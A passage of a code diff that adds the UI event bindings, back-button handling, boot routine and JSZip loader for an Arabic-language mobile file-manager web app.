+      const a = e.target.closest('[data-asc]');
+      if(s){ State.sort=s.dataset.sort; settings.sort=State.sort; Store.write(settings); closeModal(); renderBrowser(); }
+      if(a){ State.sortAsc=!State.sortAsc; settings.sortAsc=State.sortAsc; Store.write(settings); closeModal(); renderBrowser(); }
+    };
+  };
+  $('btnNew').onclick = ()=>{
+    openModal('إنشاء',
+      `<button class="setting-btn" id="newFolder"><svg><use href="#i-folder"/></svg> مجلد جديد</button>
+       <button class="setting-btn" id="newFile"><svg><use href="#i-file"/></svg> ملف نصي</button>
+       <button class="setting-btn" id="pasteBtn"><svg><use href="#i-copy"/></svg> لصق</button>`,
+      `<button class="btn primary" data-close>إغلاق</button>`);
+    $('newFolder').onclick = ()=>{ closeModal(); opCreateFolder(); };
+    $('newFile').onclick = ()=>{ closeModal(); opCreateTextFile(); };
+    $('pasteBtn').onclick = ()=>{ closeModal(); opPaste(); };
+  };
+  $('btnBrowserMore').onclick = ()=>{
+    openModal('خيارات',
+      `<button class="setting-btn" id="optSelectAll"><svg><use href="#i-check"/></svg> تحديد الكل</button>
+       <button class="setting-btn" id="optClearSel"><svg><use href="#i-close"/></svg> إلغاء التحديد</button>
+       <button class="setting-btn" id="optFav"><svg><use href="#i-star"/></svg> إضافة للمفضلة</button>
+       <button class="setting-btn" id="optStorage"><svg><use href="#i-storage"/></svg> محلل التخزين</button>
+       <button class="setting-btn" id="optLarge"><svg><use href="#i-file"/></svg> الملفات الكبيرة</button>
+       <button class="setting-btn" id="optDup"><svg><use href="#i-copy"/></svg> المكررة</button>`,
+      `<button class="btn primary" data-close>إغلاق</button>`);
+    $('optSelectAll').onclick = ()=>{ State.files.forEach(f=>State.selection.add(f.path)); renderBrowser(); closeModal(); };
+    $('optClearSel').onclick = ()=>{ clearSelection(); closeModal(); };
+    $('optFav').onclick = ()=>{
+      const files = selectedFiles();
+      if(!files.length){ toast('اختر عنصرًا أولاً','error'); return; }
+      files.forEach(f=>{
+        if(!favorites.some(x=>x.path===f.path)) favorites.push({name:f.name, path:f.path});
+      });
+      Store.writeArr('favorites', favorites);
+      toast('تمت الإضافة للمفضلة','success');
+      clearSelection(); closeModal();
+    };
+    $('optStorage').onclick = ()=>{ closeModal(); openStorageAnalyzer(); };
+    $('optLarge').onclick = ()=>{ closeModal(); openLargeFiles(); };
+    $('optDup').onclick = ()=>{ closeModal(); openDuplicateFinder(); };
+  };
+}
+
+function bindSelection(){
+  $('selClose').onclick = clearSelection;
+  $('selCopy').onclick = ()=>opCopyCut('copy');
+  $('selCut').onclick = ()=>opCopyCut('cut');
+  $('selRename').onclick = opRename;
+  $('selShare').onclick = opShare;
+  $('selZip').onclick = opZip;
+  $('selInfo').onclick = opInfo;
+  $('selDelete').onclick = opDelete;
+}
+
+function bindSearch(){
+  $('searchInput').addEventListener('input', e=>{
+    clearTimeout(searchTimer);
+    searchTimer=setTimeout(()=>runSearch(e.target.value),300);
+  });
+  $('btnSearchClear').onclick = ()=>{
+    $('searchInput').value='';
+    runSearch('');
+  };
+  $('searchType').onchange = ()=>runSearch($('searchInput').value);
+  $('searchSort').onchange = ()=>runSearch($('searchInput').value);
+}
+
+function bindViewer(){
+  $('viewerClose').onclick = ()=>{
+    $('viewer').classList.add('hidden');
+    $('viewerBody').innerHTML='';
+  };
+  $('viewerShare').onclick = ()=>{
+    const p = $('viewer').dataset.path;
+    const f = State.files.find(x=>x.path===p);
+    if(f) FS.share([f]);
+  };
+}
+
+function bindSettings(){
+  $('setTheme').value = settings.theme;
+  $('setView').value = settings.view;
+  $('setSort').value = settings.sort;
+  $('setHidden').checked = settings.showHidden;
+  $('setConfirm').checked = settings.confirmDelete;
+  $('setTrash').checked = settings.useTrash;
+
+  $('setTheme').onchange = e=>{ settings.theme=e.target.value; Store.write(settings); applyTheme(); };
+  $('setView').onchange = e=>{ settings.view=e.target.value; State.view=settings.view; Store.write(settings); };
+  $('setSort').onchange = e=>{ settings.sort=e.target.value; State.sort=settings.sort; Store.write(settings); };
+  $('setHidden').onchange = e=>{ settings.showHidden=e.target.checked; Store.write(settings); if(Nav.stack[Nav.stack.length-1]==='browser') openPath(State.currentPath); };
+  $('setConfirm').onchange = e=>{ settings.confirmDelete=e.target.checked; Store.write(settings); };
+  $('setTrash').onchange = e=>{ settings.useTrash=e.target.checked; Store.write(settings); };
+
+  $('btnOpenTrash').onclick = openTrash;
+  $('btnStorageAnalyzer').onclick = openStorageAnalyzer;
+  $('btnLargeFiles').onclick = openLargeFiles;
+  $('btnDupFinder').onclick = openDuplicateFinder;
+  $('btnFavorites').onclick = openFavorites;
+  $('btnClearRecent').onclick = ()=>{
+    recent=[]; Store.writeArr('recent', recent);
+    toast('تم مسح السجل','success');
+    renderHome();
+  };
+  $('btnAbout').onclick = openAbout;
+  $('btnTelegram').onclick = ()=>TG.open();
+}
+
+/* =========================================================
+   BACK BUTTON
+   ========================================================= */
+document.addEventListener('backbutton', ()=>{
+  if(!$('viewer').classList.contains('hidden')){ $('viewer').classList.add('hidden'); $('viewerBody').innerHTML=''; return; }
+  if(!$('modal').classList.contains('hidden')){ closeModal(); return; }
+  if(!$('permDialog').classList.contains('hidden')){ return; }
+  if(State.selection.size>0){ clearSelection(); return; }
+  Nav.back();
+}, false);
+
+/* =========================================================
+   INIT
+   ========================================================= */
+async function boot(){
+  applyTheme();
+  bindGlobal();
+  bindHome();
+  bindBrowser();
+  bindSelection();
+  bindSearch();
+  bindViewer();
+  bindSettings();
+  bindFileListEvents();
+  matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);
+
+  try{ await FS.init(); }
+  catch(e){ toast('تعذّر تهيئة نظام الملفات: '+(e.message||''),'error'); }
+
+  await renderHome();
+
+  if(settings.lastPath){
+    try{ await openPath(settings.lastPath); }catch(_){}
+  } else {
+    Nav.go('home');
+  }
+
+  setTimeout(()=>{
+    $('splash').classList.add('hide');
+    setTimeout(()=>{ const sp=$('splash'); if(sp) sp.remove(); }, 500);
+  }, 700);
+
+  TG.init();
+  TG.bootCheck();
+}
+
+document.addEventListener('DOMContentLoaded', boot);
+
+if(IS_CORDOVA){
+  document.addEventListener('deviceready', ()=>{
+    setTimeout(()=>{ TG.init(); }, 500);
+  }, false);
+}
+</script>
+
+<script>
+(function(){
+  function load(){
+    if(window.JSZip) return;
+    const s=document.createElement('script');
+    s.src='lib/jszip.min.js';
+    s.onerror=()=>{
+      const c=document.createElement('script');
+      c.src='https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js';
+      document.head.appendChild(c);
+    };
+    document.head.appendChild(s);
+  }
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', load);
+  else load();
+})();
+</script>
+
+</body>
+</html>
